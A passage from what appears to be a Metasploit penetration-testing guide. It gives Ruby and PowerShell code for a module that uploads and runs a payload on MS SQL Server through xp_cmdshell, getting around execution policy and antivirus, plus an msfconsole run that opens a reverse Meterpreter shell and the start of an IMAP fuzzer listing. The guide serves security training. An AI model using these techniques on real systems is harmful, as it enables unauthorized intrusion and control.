0pt;text-align: justify;">during our exploit. After we finally run the exploit, when we specify our payload in <span class="s19">msfconsole</span>, it will automatically generate it for us based on the <span class="s25">Msf::Util::EXE.to_win32pe(framework,payload.encoded) </span>option.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark364">Creating powershell_upload_exec</a><a name="bookmark376">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Now we’ll open the <span class="s19">mssql.rb </span>file that we opened earlier, in preparation for editing. We need to find space for the <span class="s25">powershell_upload_exec </span>function.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_527.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">root@bt:/opt/framework3/msf3# <span class="s24">nano lib/msf/core/exploit/mssql.rb</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_528.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In your version of Metasploit, you can do a search for PowerShell, and you should see the referenced code that follows in the <span class="s19">mssql.rb </span>file. Feel free to delete this code from the file and start from scratch.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_529.png"/></span></p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;text-align: left;"># Upload and execute a Windows binary through MS SQL queries and PowerShell #</p><p class="s30" style="padding-left: 58pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O<span class="s25">def powershell_upload_exec(exe, debug=false)</span></p><p class="s25" style="padding-top: 7pt;padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># hex converter</p><p class="s30" style="padding-left: 79pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8<span class="s25">hex = exe.unpack(&quot;H*&quot;)[0]</span></p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 9pt;text-align: left;"># create random alpha 8 character names</p><p class="s30" style="padding-left: 79pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@<span class="s25">var_payload = rand_text_alpha(8)</span></p><p class="s30" style="padding-bottom: 4pt;padding-left: 87pt;text-indent: -7pt;line-height: 80%;text-align: left;">O<span class="s25">print_status(&quot;Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory&quot;)</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_530.png"/></span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">At <span class="s32">O </span>you see that our definition includes the commands <span class="s25">exe </span>and <span class="s25">debug </span>parameters that are added to the <span class="s25">def powershell_upload_exec </span>function. The <span class="s25">exe </span>command is the executable we will be sending from our original code</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Msf::Util::EXE.to_win32pe(framework,payload.encoded)<span class="p">, as mentioned previ- ously. The </span>debug <span class="p">command is set to </span>false<span class="p">, which means we will not see debug information. Generally this would be set to </span>true <span class="p">if you wanted to see addi- tional information for troubleshooting.</span></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">Next, at <span class="s32">8 </span>we convert the entire encoded executable to raw hexadecimal format. The <span class="s25">H </span>in this line simply means “open the file as a binary and place it</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">in a hexadecimal representation.”</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">At <span class="s32">@ </span>we create a random, alphabetical, eight-character filename. It’s usually best to randomize this name to throw off antivirus software.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">And finally, at <span class="s32">O </span>we tell the attacker that our payload will remain on the operating system, in the SQL Server <span class="s19">/Temp </span>directory.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark365">Conversion from Hex to Binary</a><a name="bookmark377">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The following listing shows the conversion from hexadecimal back to binary, written in PowerShell. The code is defined as a string to be called later and uploaded to the target machine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_531.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Our payload converter grabs a hex file and converts it to binary through PowerShell</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 24pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><span class="s30">O </span><span class="s24">h2b </span>= &quot;$s = gc &#39;C:\\Windows\\Temp\\#{<span class="s24">var_payload</span>}&#39;;$s = [string]::Join(&#39;&#39;, $s);$s= <span class="s30">8</span>$s.</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 8pt;text-align: left;">Replace(&#39;`r&#39;,&#39;&#39;); $s = $s.Replace(&#39;&#39;`n&#39;,&#39;&#39;);$b = new-object byte[] $($s.Length/</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 88%;text-align: left;">2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}; [IO.File]::WriteAllBytes(&#39;C:\\Windows\\Temp\\#{<span class="s24">var_payload</span>}.exe&#39;,$b)&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">@ <span class="s25">h2b_unicode=Rex::Text.to_unicode(h2b)</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># base64 encoding allows us to perform execution through powershell without registry changes</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">h2b_encoded = Rex::Text.encode_base64(h2b_unicode)</span></p><p class="s30" style="padding-top: 6pt;padding-bottom: 2pt;padding-left: 24pt;text-indent: 0pt;text-align: left;">@ <span class="s25">print_status(&quot;Uploading the payload #{var_payload}, please be patient...&quot;)</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_532.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">At <span class="s32">O </span>we create the hex-to-binary (<span class="s25">h2b</span>) conversion method through PowerShell. This code essentially creates a byte array that will write out the</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">hex-based Metasploit payload as a binary file. (The <span class="s25">{var_payload} </span>is a random name specified through Metasploit.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Because MS SQL has character limit restrictions, we need to break our hexadecimal payload into 500-byte chunks that separate the payload into multiple requests. But one side effect of this splitting is that carriage returns and line feeds (CRLF) are added to the file on the target, and these need to</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">be stripped out. At <span class="s32">8 </span>we add better handling of CRLFs by stripping them out properly. If we didn’t do this, our binary would be corrupt and would not</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">execute properly. Notice that we are simply redesignating the <span class="s25">$s </span>variable to replace <span class="s25">`r </span>and <span class="s25">`n </span>with <span class="s25">&#39;&#39; </span>(nothing). This effectively removes CRLFs.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Once the CRLFs are stripped out, <span class="s25">Convert::ToByte </span>is invoked in the hex- based Metasploit payload. We tell PowerShell that the file’s format is base 16 (hexadecimal format) and to write it out to a file called <span class="s19">#{var_payload}.exe </span>(our random payload name). After the payload has been written, we can run a method for executing PowerShell commands in an encoded format that is supported by the PowerShell programming language. These encoded com- mands allow us to execute lengthy and large amounts of code on one line.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">By first converting the <span class="s25">h2b </span>string at <span class="s32">@ </span>to Unicode and then Base64 encoding the resultant string at <span class="s32">O</span>, we can pass the <span class="s25">–EncodedCommand </span>flag through PowerShell to bypass execution restrictions that would normally</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">exist. The execution restriction policies do not allow untrusted scripts to be executed. (These restrictions are an important way to protect users from exe- cuting just any script they download on the Internet.) If we didn’t encode these commands, we wouldn’t be able to execute our PowerShell code and ultimately wouldn’t be able to compromise the target system. Encoding the commands allow us to add lots of code to one command without worrying about execution restriction policies.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">After we specified the <span class="s25">h2b </span>string and encoded command flags, we get the PowerShell commands in the correct encoded format so that we can execute our PowerShell code in an unrestricted format.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">At <span class="s32">@</span>, the string was converted to Unicode; this is a requirement to have the arguments and information passed to PowerShell. The <span class="s25">h2b_encoded = Rex::Text.encoded_base64(h2b_unicode) </span>is then passed to convert it to a Base64-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">encoded string to be passed through MS SQL. Base64 is the encoding required to leverage the <span class="s25">–EncodedCommand </span>flag. We first converted our string to Unicode, and then to Base64, which is the format we need for all of our PowerShell</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: justify;">commands. Finally, at <span class="s32">@ </span>a message stating that we are in the process of uploading the payload is printed to the console.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark366">Counters</a><a name="bookmark378">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Counters help you track your location in a file or keep track of how much data the program has read in. In the next example, a base counter called <span class="s25">idx </span>starts at <span class="s25">0</span>. The counter is used to identify the end of the file and move up 500 bytes at a time when the hexadecimal-based binary is being sent to the oper- ating system. Essentially, the counter is saying, “Read 500 bytes, and then send. Read another 500 bytes, and then send,” until it reaches the end of the file.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_533.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O <span class="s25">idx=0</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">8 <span class="s25">cnt = 500</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@ <span class="s25">while(idx &lt; hex.length - 1)</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mssql_xpcmdshell(&quot;cmd.exe /c echo #{hex[idx,cnt]}&gt;&gt;%TEMP%\\#{var_payload}&quot;, false)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">idx += cnt end</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O  <span class="s24">print_status(&quot;Converting  the  payload  utilizing  PowerShell  EncodedCommand...&quot;)</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mssql_xpcmdshell(<span class="s24">&quot;powershell  -EncodedCommand  #{h2b_encoded}&quot;</span>, debug)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">mssql_xpcmdshell(&quot;cmd.exe /c del %TEMP%\\#{var_payload}&quot;, debug) print_status(&quot;Executing the payload...&quot;) mssql_xpcmdshell(&quot;%TEMP%\\#{var_payload}.exe&quot;, false, {:timeout =&gt; 1}) print_status(&quot;Be sure to cleanup #{var_payload}.exe...&quot;)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_534.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: justify;">Recall that to deliver the payload to the target operating system, we need to split it into 500-byte chunks. We use the counters <span class="s25">idx </span><span class="s32">O </span>and <span class="s25">cnt </span><span class="s32">8 </span>to track how the payload is being split up. The counter <span class="s25">idx </span>will gradually increase by 500,</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">and we set the other counter <span class="s25">cnt </span>to 500 (we need to read in 500 bytes at a time). After the first 500 bytes have been read from the Metasploit payload</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: justify;">at <span class="s32">@</span>, the 500 hexadecimal characters will be sent to the target machine. The 500-byte chunks continue to be added until the <span class="s25">idx </span>counter reaches the same</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">length as the payload, which equals the end of the file.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">At <span class="s32">O </span>we see a message that the payload is being converted and sent to the target using the <span class="s25">–EncodedCommand </span>PowerShell command, which is where the conversion is occurring from the normal PowerShell command to a Base64</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">encoded format (mentioned earlier).</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">The line <span class="s25">&quot;powershell –EncodedCommand #{h2b_encoded}&quot; </span>tells us that the pay- load has executed. The PowerShell commands that we converted to Base64 will convert the hexadecimal-based payload back to binary after it is executed.</p><p style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">The following shows the entire <span class="s19">mssql.rb </span>file:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_535.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Upload and execute a Windows binary through MSSQL queries and Powershell #</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def powershell_upload_exec(exe, debug=false)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># hex converter</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 11pt;text-align: left;">hex = exe.unpack(&quot;H*&quot;)[0]</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;text-align: left;"># create random alpha 8 character names #var_bypass = rand_text_alpha(8) var_payload = rand_text_alpha(8)</p><p class="s25" style="padding-left: 95pt;text-indent: -19pt;line-height: 87%;text-align: left;">print_status(&quot;Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory&quot;)</p><p class="s25" style="padding-top: 1pt;padding-left: 95pt;text-indent: -19pt;line-height: 87%;text-align: left;"># our payload converter, grabs a hex file and converts it to binary for us through powershell</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 10pt;text-align: left;">h2b = &quot;$s = gc &#39;C:\\Windows\\Temp\\#{var_payload}&#39;;$s = [string]::Join(&#39;&#39;, $s);$s</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">= $s.Replace(&#39;`r&#39;,&#39;&#39;); $s = $s.Replace(&#39;`n&#39;,&#39;&#39;);$b = new-object byte[]$($s</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;line-height: 87%;text-align: left;">.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring ($($_*2),2),16)};[IO.File]::WriteAllBytes(&#39;C:\\Windows\\Temp\\#{var_payload}</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">.exe&#39;,$b)&quot;</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 11pt;text-align: left;">h2b_unicode=Rex::Text.to_unicode(h2b)</p><p class="s25" style="padding-left: 95pt;text-indent: -19pt;line-height: 87%;text-align: left;"># base64 encode it, this allows us to perform execution through powershell without registry changes</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 11pt;text-align: left;">h2b_encoded = Rex::Text.encode_base64(h2b_unicode)</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;text-align: left;">print_status(&quot;Uploading the payload #{var_payload}, please be patient...&quot;) idx = 0</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cnt = 500</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 11pt;text-align: left;">while(idx &lt; hex.length - 1)</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">mssql_xpcmdshell(&quot;cmd.exe /c echo #{hex[idx,cnt]}&gt;&gt;%TEMP%\\#{var_payload}&quot;, false) idx += cnt</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;line-height: 10pt;text-align: left;">end</p><p class="s25" style="padding-left: 75pt;text-indent: 0pt;text-align: left;">print_status(&quot;Converting the payload utilizing PowerShell EncodedCommand...&quot;) mssql_xpcmdshell(&quot;powershell -EncodedCommand #{h2b_encoded}&quot;, debug) mssql_xpcmdshell(&quot;cmd.exe /c del %TEMP%\\#{var_payload}&quot;, debug) print_status(&quot;Executing the payload...&quot;) mssql_xpcmdshell(&quot;%TEMP%\\#{var_payload}.exe&quot;, false, {:timeout =&gt; 1}) print_status(&quot;Be sure to cleanup #{var_payload}.exe...&quot;)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 56pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_536.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark367">Running the Exploit</a><a name="bookmark379">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">With our work on <span class="s19">mssql_powershell.rb </span>and <span class="s19">mssql.rb </span>complete, we can run the exploit through Metasploit and <span class="s19">msfconsole</span>. But before we do, we need to make sure that PowerShell is installed. Then we can run the following com- mands to execute our newly created exploit:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_537.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use windows/mssql/mssql_powershell</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_powershell) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_powershell) &gt; <span class="s24">set LHOST 172.16.32.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 172.16.32.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_powershell) &gt; <span class="s24">set RHOST 172.16.32.136</span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 172.16.32.136</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_powershell) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Started reverse handler on 172.16.32.129:4444</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Warning: This module will leave CztBAnfG.exe in the SQL Server %TEMP% directory [*] Uploading the payload CztBAnfG, please be patient...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Converting the payload utilizing PowerShell EncodedCommand... [*] Executing the payload...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Sending stage (748032 bytes) to 172.16.32.136 [*] Be sure to cleanup CztBAnfG.exe...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Meterpreter session 1 opened (172.16.32.129:4444 -&gt; 172.16.32.136:49164) at 2010-05-17</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 10pt;text-align: left;">16:12:19 -0400</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_538.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark368">The Power of Code Reuse</a><a name="bookmark380">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">This process of leveraging existing code, tweaking it, and adding in some original code is one of the most powerful things we can do with Metasploit. You have no reason to start from scratch in most situations after you have a feel for the Framework and you take a look at how existing code works. Because this module was essentially built for you, you can get more practice by going through other Metasploit modules and seeing what they are doing and how they work. You’ll start to learn the basics of buffer overflows and how they are created. Notice how the code is structured and how it works, and then create your own exploits from scratch. If you’re not familiar with the Ruby program- ming language or if this chapter was a bit over your head, pick up a book and read and learn. The best way to learn how to create these types of module development is through trial and error.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="133" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_539.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 92pt;text-indent: 0pt;text-align: left;"><a name="bookmark381">CREATING YOUR OWN EXPLOITS </a><a name="bookmark388">&zwnj;</a><a name="bookmark389">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">As a penetration tester, you will frequently encounter applications for which no Metasploit modules are avail- able. In such situations, you can attempt to uncover vulnerabilities in the application and develop your own exploits for them.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">One of the easiest ways to discover a vulnerability is to fuzz the applica- tion. <span class="s19">Fuzz testing </span>is the act of sending invalid, unexpected, or malformed ran- dom data to an application and monitoring it for exceptions such as crashes. If a vulnerability is found, you can work to develop an exploit for it. Fuzzing is a vast topic and entire books have been written on the subject. We will only briefly scratch the surface of fuzzing prior to moving on and developing a working exploit module.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/5259/" class="s31" target="_blank">In this chapter we’ll walk you though the process of identifying a vulner- ability via fuzzing and exploit development, using the known vulnerability in NetWin SurgeMail 3.8k4-4, discovered by Matteo Memelli (ryujin) and available at </a><a href="http://www.exploit-db.com/exploits/5259/" class="s20" target="_blank">http://www.exploit-db.com/exploits/5259/</a>. This application had a vulnerabil- ity that made it improperly handle overly long <span class="s25">LIST </span>commands, resulting in a stack overflow that let an attacker execute code remotely.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span><span class="s19">This chapter assumes that you are familiar with exploit development and comfortable with the concept of buffer overflows and the use of a debugger. If you need a bit of a refresher, you’ll find some excellent tutorials by </span>corelanc0d3r <a href="http://www.exploit-db.com/" class="s20" target="_blank">on the Exploit Database site, </a><a href="http://www.exploit-db.com/" class="s31" target="_blank">http://www.exploit-db.com/</a><a href="http://www.exploit-db.com/" class="s20" target="_blank">. At a minimum, consider reading “Exploit Writing Tutorial Part 1: Stack Based Overflows” </a><a href="http://www.exploit-db.com/" class="s31" target="_blank">(http://w</a>ww.exploit-db.com/ download_pdf/13535/) <span class="s19">and “Exploit Writing Tutorial Part 3: SEH” </span><a href="http://www.exploit-db.com/download_pdf/13537/)" class="s31" target="_blank">(http:// www.exploit-db.com/download_pdf/13537/)</a><a href="http://www.exploit-db.com/download_pdf/13537/)" class="s20" target="_blank">.</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark382">The Art of Fuzzing</a><a name="bookmark390">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Before you develop any exploit, you need to determine whether a vulnerabil- ity exists in the application. This is where fuzzing comes into play.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The following listing shows the code for a simple Internet Message Access Protocol (IMAP) fuzzer. Save this to your <span class="s19">/root/.msf3/modules/auxiliary/fuzzers/ </span>directory, but be sure to keep your testing modules in a folder separate from the main Metasploit trunk.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_540.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">require &#39;msf/core&#39;</p><p class="s25" style="padding-top: 1pt;padding-left: 49pt;text-indent: -12pt;line-height: 77%;text-align: left;">class Metasploit3 &lt; Msf::Auxiliary <span class="s30">O</span>include <span class="s24">Msf::Exploit::Remote::Imap </span><span class="s30">8</span>include <span class="s24">Msf::Auxiliary::Dos</span></p><p class="s25" style="text-indent: 0pt;line-height: 9pt;text-align: right;">def initialize</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: right;">super(</p><p class="s25" style="padding-left: 132pt;text-indent: 0pt;text-align: left;">&#39;Name&#39; =&gt; &#39;Simple IMAP Fuzzer&#39;, &#39;Description&#39; =&gt; %q{</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p class="s25" style="padding-left: 68pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 10pt;text-align: left;">An example of how to build a simple IMAP fuzzer.</p><p class="s25" style="padding-left: 137pt;text-indent: -16pt;line-height: 87%;text-align: left;">Account IMAP credentials are required in this fuzzer.},</p><p class="s25" style="padding-left: 25pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Author&#39; =&gt; [ &#39;ryujin&#39; ],</p><p class="s25" style="padding-left: 25pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE,</p><p class="s25" style="padding-left: 25pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Version&#39; =&gt; &#39;$Revision: 1 $&#39;</p><p class="s25" style="padding-left: 68pt;text-indent: 0pt;line-height: 10pt;text-align: left;">def fuzz_str()</p><p class="s30" style="padding-left: 91pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@<span class="s24">return Rex::Text.rand_text_alphanumeric(rand(1024))</span></p><p class="s25" style="padding-left: 68pt;text-indent: 0pt;line-height: 9pt;text-align: left;">end</p><p class="s25" style="padding-left: 68pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def run()</p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;text-align: left;">srand(0) while (true)</p><p class="s30" style="padding-left: 132pt;text-indent: -6pt;line-height: 80%;text-align: left;">O<span class="s25">connected = connect_login() if not connected</span></p><p class="s25" style="padding-left: 164pt;text-indent: -8pt;text-align: left;">print_status(<span class="s24">&quot;Host  is  not  responding  -  this  is  G00D  ;</span>)&quot;) break</p><p class="s25" style="padding-left: 132pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p class="s25" style="padding-left: 132pt;text-indent: 0pt;line-height: 10pt;text-align: left;">print_status(&quot;Generating fuzzed data...&quot;)</p><p class="s30" style="padding-left: 124pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@<span class="s24">fuzzed = fuzz_str()</span></p><p class="s25" style="padding-left: 132pt;text-indent: 0pt;line-height: 9pt;text-align: left;">print_status(&quot;Sending fuzzed data, buffer length = %d&quot; % fuzzed.length)</p><p class="s30" style="padding-top: 1pt;padding-left: 132pt;text-indent: -8pt;line-height: 80%;text-align: left;">0<span class="s25">req = 